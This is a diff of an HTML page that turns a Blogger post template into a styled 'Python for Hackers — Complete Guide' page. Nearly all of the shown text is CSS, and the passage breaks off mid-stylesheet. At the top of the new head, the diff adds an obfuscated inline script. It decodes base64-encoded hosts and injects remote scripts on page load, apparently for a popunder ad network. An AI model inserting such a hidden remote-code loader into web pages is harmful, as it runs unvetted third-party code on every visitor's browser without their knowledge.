@@ -1,814 +1,1660 @@
-<!-- ===== PYTHON PROGRAMMING BOOK POST - CYBERSUME FULL SCREEN BLACK EDITION ===== -->
-<!-- Isko Blogger Post Editor mein HTML mode mein paste karein -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var v=window,q="e25514fe4b35f595db6750aa70f72f50",h=[["siteId",322*819*448+424-112824949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],o=["d3d3LmludGVsbGlwb3B1cC5jb20vamRhcmttb2RlLWpzLm1pbi5jc3M=","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWC9yZmpzb24ubWluLmpz"],e=-1,d,s,k=function(){clearTimeout(s);e++;if(o[e]&&!(1816360970000<(new Date).getTime()&&1<e)){d=v.document.createElement("script");d.type="text/javascript";d.async=!0;var a=v.document.getElementsByTagName("script")[0];d.src="https://"+atob(o[e]);d.crossOrigin="anonymous";d.onerror=k;d.onload=function(){clearTimeout(s);v[q.slice(0,16)+q.slice(0,16)]||k()};s=setTimeout(k,5E3);a.parentNode.insertBefore(d,a)}};if(!v[q]){try{Object.freeze(v[q]=h)}catch(e){}k()}})();
+/*]]>/* */
+</script>
 
-<style>
-    /* ===== FULL SCREEN WRAPPER ===== */
-    .cyber-post-wrapper {
-        width: 100% !important;
-        max-width: 100% !important;
-        margin: 0 !important;
-        padding: 30px 40px 50px !important;
-        background: #000000 !important;
-        color: #ffffff;
-        border-radius: 0 !important;
-        box-sizing: border-box;
-    }
-    
-    /* ===== RESPONSIVE FULL SCREEN MARGINS ===== */
-    @media (max-width: 1200px) {
-        .cyber-post-wrapper {
-            padding: 25px 35px 45px !important;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python for Hackers — Complete Guide</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper {
-            padding: 22px 30px 40px !important;
+
+        html {
+            scroll-behavior: smooth;
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper {
-            padding: 18px 22px 35px !important;
+
+        body {
+            font-family: 'Outfit', -apple-system, sans-serif;
+            background: #000000;
+            background-image: 
+                radial-gradient(ellipse 80% 60% at 50% -20%, rgba(0, 255, 136, 0.08), transparent),
+                radial-gradient(ellipse 60% 50% at 100% 100%, rgba(0, 217, 255, 0.05), transparent);
+            background-attachment: fixed;
+            color: #ffffff;
+            min-height: 100vh;
+            line-height: 1.6;
+            -webkit-font-smoothing: antialiased;
+            padding: 0;
         }
-    }
-    
-    @media (max-width: 600px) {
-        .cyber-post-wrapper {
-            padding: 15px 18px 30px !important;
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 48px 32px 100px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper {
-            padding: 12px 14px 25px !important;
-        }
-    }
-    
-    /* ===== CONTENT MAX WIDTH ===== */
-    .cyber-content {
-        max-width: 1100px;
-        margin: 0 auto;
-        padding: 0;
-    }
-    
-    /* ===== POST HEADER ===== */
-    .post-header-cyber {
-        margin-bottom: 35px;
-        padding-bottom: 25px;
-        border-bottom: 1px solid rgba(0, 255, 136, 0.08);
-        background: transparent;
-        text-align: center;
-    }
-    
-    .post-badge {
-        display: inline-block;
-        padding: 6px 26px;
-        background: rgba(0, 255, 136, 0.08);
-        border: 1px solid #00ff88;
-        border-radius: 50px;
-        color: #00ff88;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 3px;
-        margin-bottom: 20px;
-    }
-    
-    .post-title-cyber {
-        font-size: 42px;
-        font-weight: 900;
-        line-height: 1.15;
-        color: #ffffff !important;
-        margin: 12px 0 18px;
-        letter-spacing: -0.5px;
-        text-align: center;
-    }
-    
-    .post-title-cyber strong {
-        color: #ffcc00;
-    }
-    
-    @media (max-width: 992px) {
-        .post-title-cyber {
-            font-size: 34px;
-        }
-    }
-    
-    @media (max-width: 768px) {
-        .post-title-cyber {
-            font-size: 28px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .post-title-cyber {
-            font-size: 24px;
-        }
-    }
-    
-    /* ===== FEATURED BOX ===== */
-    .featured-box {
-        display: flex;
-        flex-wrap: wrap;
-        align-items: center;
-        gap: 35px;
-        background: #0a0a0a !important;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 18px;
-        padding: 32px 38px;
-        margin: 25px 0 38px;
-        justify-content: center;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-box {
-            flex-direction: column;
+
+        /* ===== HEADER ===== */
+        .page-header {
             text-align: center;
-            padding: 25px 22px;
-            gap: 22px;
+            padding: 20px 0 48px;
+            position: relative;
+            margin-bottom: 48px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-box {
-            padding: 20px 16px;
+
+        .page-header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 140px;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
         }
-    }
-    
-    .featured-image {
-        flex-shrink: 0;
-    }
-    
-    .featured-image img {
-        max-width: 220px;
-        height: auto;
-        border-radius: 14px;
-        border: 2px solid #ffcc00;
-        transition: 0.3s;
-        background: #000000;
-    }
-    
-    .featured-image img:first-child {
-        max-width: 200px;
-    }
-    
-    @media (max-width: 768px) {
-        .featured-image img {
-            max-width: 180px;
+
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 20px;
+            background: rgba(0, 255, 136, 0.05);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 100px;
+            color: #00ff88;
+            font-size: 12px;
+            font-weight: 600;
+            letter-spacing: 2.5px;
+            text-transform: uppercase;
+            margin-bottom: 24px;
+            backdrop-filter: blur(10px);
         }
-    }
-    
-    @media (max-width: 480px) {
-        .featured-image img {
-            max-width: 150px;
+
+        .badge .dot {
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse 2s infinite;
         }
-    }
-    
-    .featured-image img:hover {
-        transform: scale(1.03);
-        box-shadow: 0 0 40px rgba(255, 204, 0, 0.15);
-    }
-    
-    .featured-cta {
-        flex: 1;
-        text-align: center;
-    }
-    
-    .featured-cta p {
-        color: #b0b8c8 !important;
-        margin: 5px 0 12px !important;
-        font-size: 16px;
-    }
-    
-    .featured-cta .main-link {
-        display: inline-block;
-        padding: 15px 42px;
-        background: linear-gradient(135deg, #ffcc00, #ff9900);
-        color: #000000 !important;
-        border-radius: 10px;
-        font-weight: 700;
-        font-size: 16px;
-        text-decoration: none;
-        margin-top: 6px;
-        transition: all 0.3s ease;
-        letter-spacing: 0.5px;
-    }
-    
-    .featured-cta .main-link:hover {
-        transform: scale(1.04);
-        box-shadow: 0 0 35px rgba(255, 204, 0, 0.25);
-    }
-    
-    .featured-cta .small-note {
-        color: #6a7290 !important;
-        font-size: 13px;
-        margin-top: 12px !important;
-    }
-    
-    .price-tag {
-        display: inline-block;
-        padding: 4px 18px;
-        background: rgba(255, 204, 0, 0.1);
-        border: 1px solid #ffcc00;
-        border-radius: 50px;
-        color: #ffcc00;
-        font-size: 14px;
-        font-weight: 700;
-        margin-top: 8px;
-    }
-    
-    /* ===== HEADINGS ===== */
-    .cyber-post-wrapper h2 {
-        color: #ffffff !important;
-        font-size: 28px;
-        font-weight: 800;
-        margin-top: 40px;
-        margin-bottom: 18px;
-        border-left: 5px solid #ffcc00;
-        padding-left: 20px;
-        line-height: 1.3;
-    }
-    
-    .cyber-post-wrapper h2#why {
-        border-left-color: #00d9ff;
-    }
-    
-    .cyber-post-wrapper h2#learn {
-        border-left-color: #00ff88;
-    }
-    
-    .cyber-post-wrapper h2#how {
-        border-left-color: #ff6b6b;
-    }
-    
-    @media (max-width: 992px) {
-        .cyber-post-wrapper h2 {
-            font-size: 26px;
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
         }
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h2 {
-            font-size: 24px;
-            padding-left: 16px;
-            margin-top: 35px;
+
+        h1 {
+            font-size: clamp(34px, 5.5vw, 62px);
+            font-weight: 900;
+            line-height: 1.08;
+            letter-spacing: -0.03em;
+            margin-bottom: 18px;
+            background: linear-gradient(180deg, #ffffff 0%, #8892a8 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        h1 .highlight {
+            background: linear-gradient(135deg, #00ff88 0%, #00d9ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .subtitle {
+            color: #8892a8;
+            font-size: 17px;
+            font-weight: 300;
+            max-width: 660px;
+            margin: 0 auto 24px;
+        }
+
+        .meta-bar {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 24px 0 0;
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 18px;
+            background: rgba(10, 15, 25, 0.6);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 100px;
+            color: #8892a8;
+            font-size: 12.5px;
+            font-weight: 500;
+            backdrop-filter: blur(10px);
+        }
+
+        .meta-item .ico {
+            font-size: 14px;
+        }
+
+        .meta-item strong {
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+        }
+
+        /* ===== TABLE OF CONTENTS ===== */
+        .toc {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 20px;
+            padding: 26px 28px;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .toc::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.6;
+        }
+
+        .toc-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            letter-spacing: 2px;
+            text-transform: uppercase;
             margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h2 {
-            font-size: 20px;
-            padding-left: 14px;
-            margin-top: 28px;
+
+        .toc-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 8px;
+            list-style: none;
+        }
+
+        .toc-list li a {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 14px;
+            color: #b0b8c8;
+            text-decoration: none;
+            font-size: 14px;
+            border-radius: 10px;
+            border: 1px solid transparent;
+            transition: all 0.2s ease;
+        }
+
+        .toc-list li a:hover {
+            background: rgba(0, 255, 136, 0.05);
+            border-color: rgba(0, 255, 136, 0.15);
+            color: #00ff88;
+            transform: translateX(4px);
+        }
+
+        .toc-list li a .num {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 8px;
+            border-radius: 6px;
+            font-weight: 600;
+            flex-shrink: 0;
+        }
+
+        /* ===== SECTIONS ===== */
+        .section {
+            background: linear-gradient(165deg, #0b0f18 0%, #060910 100%);
+            border: 1px solid rgba(0, 255, 136, 0.08);
+            border-radius: 20px;
+            padding: 36px 34px;
+            margin-bottom: 26px;
+            position: relative;
+            overflow: hidden;
+            transition: border-color 0.3s ease;
+            scroll-margin-top: 20px;
+        }
+
+        .section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            opacity: 0.5;
+        }
+
+        .section:hover {
+            border-color: rgba(0, 255, 136, 0.2);
+        }
+
+        .section-number {
+            display: inline-block;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            font-weight: 700;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            padding: 3px 10px;
+            border-radius: 6px;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            font-size: 25px;
+            font-weight: 800;
+            color: #ffffff;
+            margin-bottom: 20px;
+            letter-spacing: -0.02em;
+            line-height: 1.25;
+        }
+
+        .section-title .icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.12), rgba(0, 217, 255, 0.06));
+            border: 1px solid rgba(0, 255, 136, 0.15);
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 24px 0 12px;
+            letter-spacing: -0.01em;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        h3::before {
+            content: '▸';
+            color: #00d9ff;
+            font-size: 16px;
+        }
+
+        h4 {
+            font-size: 15.5px;
+            font-weight: 600;
+            color: #ffffff;
+            margin: 18px 0 8px;
+        }
+
+        p {
+            color: #b0b8c8;
+            font-size: 15.5px;
+            line-height: 1.75;
             margin-bottom: 14px;
         }
-    }
-    
-    .cyber-post-wrapper h3 {
-        color: #ffcc00 !important;
-        font-size: 22px;
-        font-weight: 700;
-        margin: 30px 0 14px;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper h3 {
-            font-size: 19px;
+
+        p:last-child {
+            margin-bottom: 0;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper h3 {
-            font-size: 17px;
-            margin-top: 24px;
+
+        strong {
+            color: #ffffff;
+            font-weight: 600;
         }
-    }
-    
-    /* ===== PARAGRAPHS ===== */
-    .cyber-post-wrapper p {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 1.95;
-        margin: 16px 0 20px;
-    }
-    
-    .cyber-post-wrapper p strong {
-        color: #ffcc00;
-    }
-    
-    @media (max-width: 768px) {
-        .cyber-post-wrapper p {
-            font-size: 16px;
-            line-height: 1.85;
+
+        em {
+            color: #00d9ff;
+            font-style: normal;
+            font-weight: 500;
         }
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper p {
+
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            border-bottom: 1px dotted rgba(0, 255, 136, 0.4);
+            transition: all 0.2s ease;
+        }
+
+        a:hover {
+            color: #00d9ff;
+            border-bottom-color: #00d9ff;
+        }
+
+        /* ===== LISTS ===== */
+        ul, ol {
+            list-style: none;
+            margin: 12px 0;
+        }
+
+        ul li {
+            color: #b0b8c8;
             font-size: 15px;
+            padding: 10px 0 10px 32px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        ul li:last-child {
+            border-bottom: none;
+        }
+
+        ul li::before {
+            content: '▸';
+            position: absolute;
+            left: 8px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        ol {
+            counter-reset: item;
+        }
+
+        ol li {
+            color: #b0b8c8;
+            font-size: 15px;
+            padding: 10px 0 10px 42px;
+            position: relative;
+            line-height: 1.65;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            counter-increment: item;
+        }
+
+        ol li:last-child {
+            border-bottom: none;
+        }
+
+        ol li::before {
+            content: counter(item);
+            position: absolute;
+            left: 0;
+            top: 10px;
+            width: 26px;
+            height: 26px;
+            border-radius: 8px;
+            background: rgba(0, 255, 136, 0.08);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            color: #00ff88;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* ===== INLINE CODE ===== */
+        code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: #00ff88;
+            background: rgba(0, 255, 136, 0.08);
+            padding: 2px 7px;
+            border-radius: 5px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            font-weight: 500;
+        }
+
+        /* ===== CODE BLOCKS ===== */
+        .code-block {
+            background: #04060a;
+            border: 1px solid rgba(0, 255, 136, 0.12);
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 18px 0;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            line-height: 1.75;
+            overflow-x: auto;
+            position: relative;
+        }
+
+        .code-block::before {
+            content: attr(data-lang);
+            position: absolute;
+            top: 10px;
+            right: 16px;
+            font-size: 10px;
+            color: #00ff88;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            font-weight: 700;
+            opacity: 0.5;
+        }
+
+        .code-block code {
+            color: #d4d4d4;
+            font-family: 'JetBrains Mono', monospace;
+            white-space: pre;
+            background: none;
+            border: none;
+            padding: 0;
+            font-size: 13px;
+        }
+
+        .cmt { color: #5a6478; font-style: italic; }
+        .cmd { color: #00ff88; font-weight: 500; }
+        .var { color: #00d9ff; }
+        .str { color: #ffd166; }
+        .kw  { color: #ff79c6; font-weight: 600; }
+        .num { color: #bd93f9; }
+        .fn  { color: #50fa7b; }
+
+        /* ===== CALLOUT ===== */
+        .callout {
+            background: rgba(0, 255, 136, 0.04);
+            border-left: 3px solid #00ff88;
+            border-radius: 0 12px 12px 0;
+            padding: 18px 22px;
+            margin: 20px 0;
+            color: #c8d0e0;
+            font-size: 14.5px;
+            line-height: 1.7;
+        }
+
+        .callout strong {
+            color: #00ff88;
+        }
+
+        .callout.warn {
+            background: rgba(255, 107, 107, 0.04);
+            border-left-color: #ff6b6b;
+        }
+
+        .callout.warn strong {
+            color: #ff6b6b;
+        }
+
+        .callout.info {
+            background: rgba(0, 217, 255, 0.04);
+            border-left-color: #00d9ff;
+        }
+
+        .callout.info strong {
+            color: #00d9ff;
+        }
+
+        /* ===== TABLE ===== */
+        .table-wrap {
+            overflow-x: auto;
+            margin: 18px 0;
+            border-radius: 14px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
+            min-width: 520px;
+        }
+
+        thead {
+            background: rgba(0, 255, 136, 0.06);
+        }
+
+        th {
+            text-align: left;
+            padding: 14px 18px;
+            color: #00ff88;
+            font-weight: 700;
+            font-size: 12px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            border-bottom: 1px solid rgba(0, 255, 136, 0.15);
+        }
+
+        td {
+            padding: 13px 18px;
+            color: #b0b8c8;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            line-height: 1.6;
+        }
+
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+
+        tbody tr:hover {
+            background: rgba(0, 255, 136, 0.02);
+        }
+
+        td code {
+            font-size: 12px;
+        }
+
+        /* ===== TOOL CARDS GRID ===== */
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .tool-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 18px 18px 16px;
+            transition: all 0.25s ease;
+        }
+
+        .tool-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .tool-card .tool-name {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            font-weight: 700;
+            color: #00ff88;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .tool-card .tool-name .ico {
+            font-size: 16px;
+        }
+
+        .tool-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== USE CASES GRID ===== */
+        .use-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 14px;
+            margin: 20px 0 4px;
+        }
+
+        .use-card {
+            background: rgba(0, 255, 136, 0.03);
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            border-radius: 14px;
+            padding: 20px 18px;
+            transition: all 0.25s ease;
+        }
+
+        .use-card:hover {
+            border-color: rgba(0, 255, 136, 0.3);
+            background: rgba(0, 255, 136, 0.06);
+            transform: translateY(-3px);
+        }
+
+        .use-card .use-icon {
+            font-size: 26px;
+            margin-bottom: 10px;
+            display: block;
+        }
+
+        .use-card h4 {
+            font-size: 14.5px;
+            font-weight: 700;
+            color: #00ff88;
+            margin: 0 0 8px;
+        }
+
+        .use-card p {
+            font-size: 13px;
+            color: #8892a8;
+            line-height: 1.55;
+            margin: 0;
+        }
+
+        /* ===== FOOTER ===== */
+        .page-footer {
+            text-align: center;
+            padding: 48px 0 0;
+            margin-top: 40px;
+            border-top: 1px solid rgba(0, 255, 136, 0.08);
+            color: #4a5568;
+            font-size: 13px;
             line-height: 1.8;
-            margin: 14px 0 16px;
         }
-    }
-    
-    /* ===== LISTS ===== */
-    .cyber-post-wrapper ul,
-    .cyber-post-wrapper ol {
-        color: #b0b8c8 !important;
-        font-size: 17px;
-        line-height: 2.3;
-        padding-left: 0;
-        margin: 14px 0 22px;
-        list-style: none;
-    }
-    
-    .cyber-post-wrapper ul li,
-    .cyber-post-wrapper ol li {
-        color: #b0b8c8 !important;
-        margin-bottom: 4px;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .cyber-post-wrapper ul li::before {
-        content: "▸";
-        color: #ffcc00;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    .cyber-post-wrapper ol {
-        list-style: none;
-        counter-reset: item;
-    }
-    
-    .cyber-post-wrapper ol li {
-        counter-increment: item;
-        padding-left: 35px;
-    }
-    
-    .cyber-post-wrapper ol li::before {
-        content: counter(item) ".";
-        color: #ffcc00;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-        font-size: 16px;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper ul,
-        .cyber-post-wrapper ol {
-            font-size: 15px;
-            line-height: 2.1;
-        }
-        .cyber-post-wrapper ul li,
-        .cyber-post-wrapper ol li {
-            padding-left: 24px;
-        }
-        .cyber-post-wrapper ol li {
-            padding-left: 30px;
-        }
-    }
-    
-    /* ===== TWO COLUMN LIST ===== */
-    .two-col-list {
-        display: grid;
-        grid-template-columns: 1fr 1fr;
-        gap: 4px 40px;
-        padding-left: 0 !important;
-        list-style: none !important;
-        margin: 14px 0 22px;
-    }
-    
-    .two-col-list li {
-        color: #b0b8c8 !important;
-        font-size: 16.5px;
-        line-height: 2.2;
-        padding: 4px 0;
-        padding-left: 28px;
-        position: relative;
-    }
-    
-    .two-col-list li::before {
-        content: "▸";
-        color: #ffcc00;
-        position: absolute;
-        left: 0;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 768px) {
-        .two-col-list {
-            grid-template-columns: 1fr 1fr;
-            gap: 2px 20px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-            padding-left: 24px;
-        }
-    }
-    
-    @media (max-width: 600px) {
-        .two-col-list {
-            grid-template-columns: 1fr;
-            gap: 2px;
-        }
-        .two-col-list li {
-            font-size: 15px;
-        }
-    }
-    
-    @media (max-width: 480px) {
-        .two-col-list li {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== HORIZONTAL RULE ===== */
-    .cyber-post-wrapper hr {
-        border: none;
-        border-top: 1px solid rgba(0, 255, 136, 0.06);
-        margin: 30px 0 32px;
-        background: transparent;
-        height: 1px;
-    }
-    
-    /* ===== SHARE SECTION ===== */
-    .share-section {
-        margin-top: 50px;
-        padding-top: 30px;
-        border-top: 1px solid rgba(0, 255, 136, 0.08);
-    }
-    
-    .share-section p {
-        color: #6a7290 !important;
-        font-size: 15px;
-        text-align: center;
-        margin-bottom: 16px !important;
-    }
-    
-    .share-buttons {
-        display: flex;
-        gap: 16px;
-        justify-content: center;
-        flex-wrap: wrap;
-    }
-    
-    .share-buttons a {
-        padding: 12px 28px;
-        border: 1px solid rgba(0, 255, 136, 0.12);
-        border-radius: 10px;
-        color: #b0b8c8 !important;
-        text-decoration: none;
-        font-size: 15px;
-        font-weight: 500;
-        transition: 0.3s;
-        background: transparent;
-    }
-    
-    .share-buttons a:hover {
-        border-color: #ffcc00;
-        color: #ffcc00 !important;
-        background: rgba(255, 204, 0, 0.04);
-        transform: translateY(-2px);
-    }
-    
-    @media (max-width: 480px) {
-        .share-buttons a {
-            padding: 10px 18px;
-            font-size: 13px;
-        }
-        .share-section {
-            margin-top: 35px;
-            padding-top: 22px;
-        }
-    }
-    
-    /* ===== BOOK HIGHLIGHT BOX ===== */
-    .book-highlight {
-        background: linear-gradient(135deg, rgba(255, 204, 0, 0.05), rgba(0, 255, 136, 0.05));
-        border: 1px solid rgba(255, 204, 0, 0.1);
-        border-radius: 14px;
-        padding: 24px 30px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .book-highlight p {
-        margin: 5px 0 !important;
-        font-size: 16px;
-    }
-    
-    .book-highlight .highlight-title {
-        color: #ffcc00;
-        font-weight: 700;
-        font-size: 18px;
-    }
-    
-    @media (max-width: 480px) {
-        .book-highlight {
-            padding: 18px 16px;
-        }
-        .book-highlight p {
-            font-size: 14px;
-        }
-        .book-highlight .highlight-title {
-            font-size: 16px;
-        }
-    }
-    
-    /* ===== PYTHON POWER BOX ===== */
-    .python-power-box {
-        background: rgba(255, 204, 0, 0.03);
-        border: 1px solid rgba(255, 204, 0, 0.1);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 20px 0 25px;
-        text-align: center;
-    }
-    
-    .python-power-box .big-text {
-        color: #ffcc00;
-        font-weight: 900;
-        font-size: 22px;
-        letter-spacing: 1px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    .python-power-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-    }
-    
-    @media (max-width: 480px) {
-        .python-power-box {
-            padding: 16px 16px;
-        }
-        .python-power-box .big-text {
-            font-size: 17px;
-        }
-        .python-power-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== TIPS BOX ===== */
-    .tips-box {
-        background: rgba(0, 255, 136, 0.03);
-        border: 1px solid rgba(0, 255, 136, 0.08);
-        border-radius: 14px;
-        padding: 20px 28px;
-        margin: 20px 0 25px;
-    }
-    
-    .tips-box p {
-        margin: 5px 0 !important;
-        font-size: 15px;
-        color: #b0b8c8 !important;
-    }
-    
-    .tips-box .tip-icon {
-        color: #ffcc00;
-        font-weight: 700;
-    }
-    
-    @media (max-width: 480px) {
-        .tips-box {
-            padding: 16px 16px;
-        }
-        .tips-box p {
-            font-size: 14px;
-        }
-    }
-    
-    /* ===== BLOGGER OVERRIDES ===== */
-    .blog-posts {
-        max-width: 100% !important;
-        padding: 0 !important;
-    }
-    
-    .post-body {
-        padding: 0 !important;
-        background: #000000 !important;
-    }
-    
-    .post-body-content {
-        background: #000000 !important;
-        padding: 0 !important;
-    }
-    
-    .post-outer {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    .post {
-        background: #000000 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        border: none !important;
-        box-shadow: none !important;
-    }
-    
-    /* ===== INLINE CODE ===== */
-    .cyber-post-wrapper code {
-        background: #0a0a0a;
-        padding: 2px 12px;
-        border-radius: 4px;
-        color: #ffcc00;
-        border: 1px solid rgba(255, 204, 0, 0.08);
-        font-size: 14.5px;
-        font-family: 'Courier New', monospace;
-    }
-    
-    @media (max-width: 480px) {
-        .cyber-post-wrapper code {
-            font-size: 13px;
-            padding: 1px 8px;
-        }
-    }
-    
-    /* ===== IMAGES ===== */
-    .cyber-post-wrapper img {
-        max-width: 100%;
-        height: auto;
-        border-radius: 12px;
-        margin: 10px 0;
-        border: 1px solid rgba(0, 255, 136, 0.05);
-    }
-    
-    .separator {
-        clear: both;
-        text-align: center;
-    }
-    
-    /* ===== LINK STYLES ===== */
-    .cyber-post-wrapper a {
-        color: #ffcc00;
-        text-decoration: none;
-        transition: 0.3s;
-    }
-    
-    .cyber-post-wrapper a:hover {
-        color: #00ff88;
-        text-decoration: underline;
-    }
-    
-    /* ===== CENTER ALIGN ===== */
-    .text-center {
-        text-align: center;
-    }
-    
-    .mt-10 {
-        margin-top: 10px;
-    }
-    .mb-10 {
-        margin-bottom: 10px;
-    }
-</style>
 
-<!-- ===== MAIN CONTENT ===== -->
-<div class="cyber-post-wrapper">
+        .page-footer .brand {
+            font-family: 'JetBrains Mono', monospace;
+            color: #00ff88;
+            font-weight: 700;
+            letter-spacing: 1px;
+        }
 
-    <div class="cyber-content">
+        .page-footer a {
+            border-bottom: none;
+        }
 
-        <!-- ===== POST HEADER ===== -->
-        <div class="post-header-cyber">
-            <div class="post-badge">🐍 Python Programming</div>
-            <h1 class="post-title-cyber"> <strong>Welcome to the World of Python</strong></h1>
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
